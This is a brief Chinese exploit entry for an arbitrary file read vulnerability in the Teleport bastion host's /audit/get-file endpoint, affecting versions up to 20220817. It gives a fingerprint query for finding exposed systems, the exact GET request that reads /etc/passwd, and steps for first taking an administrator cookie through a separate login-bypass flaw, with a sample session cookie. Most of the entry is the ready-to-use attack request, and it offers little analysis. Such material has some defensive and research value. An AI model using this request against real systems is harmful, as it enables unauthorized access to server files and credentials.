# Teleport堡垒机get-file后台任意文件读取漏洞

- **系统**：Teleport　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="Teleport 堡垒机系统"`
- **请求**：`GET /audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0 HTTP/1.1`

**请求体 / payload**
```
1. 通过`Teleport堡垒机 do-login 任意用户登录漏洞`登录后台，获取管理员cookie
2. 通过上一步获取到的cookie读取服务器上的文件
Host: xx.xx.xx.xx
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
```

**其他**
- Teleport堡垒机 get-file 后台任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Teleport堡垒机<= 20220817